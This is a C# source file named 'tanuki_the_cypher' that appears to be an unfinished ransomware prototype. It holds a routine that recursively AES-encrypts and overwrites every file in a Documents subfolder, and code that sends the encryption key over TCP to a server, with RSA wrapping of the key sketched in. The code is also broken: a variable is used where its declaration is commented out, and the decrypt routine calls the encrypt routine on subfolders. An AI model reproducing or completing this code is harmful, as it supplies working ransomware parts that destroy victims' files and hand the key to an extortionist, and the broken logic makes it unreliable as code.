using System;
using System.ComponentModel;
using System.IO;
using System.Security.Cryptography;
using System.Numerics;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace tanuki_the_cypher
{
    class Program
    {
        static void Main(string[] args)
        {
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\esempio";

            byte[] key = null;
            byte[] iv = null;
            using (Aes aes = Aes.Create())
            {
                key = aes.Key;
                iv = aes.IV;
            }

            //EncryptFiles(folder, key, iv);

            RSA rsa = RSA.Create();


            TcpClient client;
            NetworkStream stream;
            client = new TcpClient("localhost", 6000);
            stream = client.GetStream();

            Packets.Request.SendKey sendKey = new Packets.Request.SendKey() { Operation = "keyStore", Key = Encoding.Default.GetString(key) };
            string sendKey_Json = JsonSerializer.Serialize<Packets.Request.SendKey>(sendKey);
            byte[] request_bytes = Encoding.ASCII.GetBytes(sendKey_Json.ToString());
            Console.WriteLine("JSON: " + sendKey_Json);
            //byte[] payload = RSAEncrypt(request_bytes, RSAParams, false);

            try
            {
                stream.Write(payload, 0, payload.Length);
                Console.WriteLine("Message sent");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sendig message: " + ex.Message);
            }

            Console.ReadLine();



            //RSAEncrypt(key, );

            //DecryptFiles(folder, key, iv);

        }

        static public void EncryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string content = File.ReadAllText(file);
                byte[] encrypted = Encrypt(content, key, iv);
                File.WriteAllBytes(file, encrypted);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                EncryptFiles(folder, key, iv);
            }
        }

        static public byte[] Encrypt(string content, byte[] key, byte[] iv)
        {
            byte[] encrypted = null;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(content);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return encrypted;
        }

        static public void DecryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                byte[] content = File.ReadAllBytes(file);
                string plainText = Decrypt(content, key, iv);
                File.WriteAllText(file, plainText);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                EncryptFiles(folder, key, iv);
            }
        }

        static public string Decrypt(byte[] content, byte[] key, byte[] iv)
        {
            string plaintext = null;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(content))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }

            return plaintext;
        }

        public static byte[] RSAEncrypt(byte[] DataToEncrypt, RSAParameters RSAKeyInfo, bool DoOAEPPadding)
        {
            
            try
            {
                byte[] encryptedData;
                //Create a new instance of RSACryptoServiceProvider.
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {

                    //Import the RSA Key information. This only needs
                    //toinclude the public key information.
                    RSA.ImportParameters(RSAKeyInfo);
                    
                    //Encrypt the passed byte array and specify OAEP padding.  
                    //OAEP padding is only available on Microsoft Windows XP or
                    //later.  
                    encryptedData = RSA.Encrypt(DataToEncrypt, DoOAEPPadding);
                }
                return encryptedData;
            }
            //Catch and display a CryptographicException  
            //to the console.
            catch (CryptographicException e)
            {
                Console.WriteLine(e.Message);

                return null;
            }
        }

        static public void SendKey()
        {

        }
    }

}
